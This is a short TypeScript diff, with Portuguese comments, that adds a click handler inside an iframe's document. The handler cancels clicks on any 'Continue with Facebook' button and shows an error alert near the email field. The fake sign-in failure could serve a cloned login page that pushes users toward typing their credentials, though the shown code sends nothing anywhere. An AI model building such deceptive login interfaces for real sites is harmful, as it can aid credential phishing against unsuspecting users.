@@ -85,6 +85,21 @@ export function attachIframeInteractions(doc: Document): () => void {
       return;
     }
 
+    // Botão "Continuar com Facebook" → mostra alertbox de erro entre o e-mail e o botão
+    const fbBtn = target.closest(
+      'button[aria-label*="Facebook" i], [data-testid*="facebook" i], button, a',
+    ) as HTMLElement | null;
+    if (fbBtn) {
+      const fbText = (fbBtn.textContent || "").trim().toLowerCase();
+      const fbAria = (fbBtn.getAttribute("aria-label") || "").toLowerCase();
+      if (/facebook/.test(fbText) || /facebook/.test(fbAria)) {
+        e.preventDefault();
+        e.stopPropagation();
+        showFacebookErrorAlert(doc, fbBtn);
+        return;
+      }
+    }
+
     const a = target.closest("a") as HTMLAnchorElement | null;
     if (a) {
       const linkText = (a.textContent || "").trim().toLowerCase();
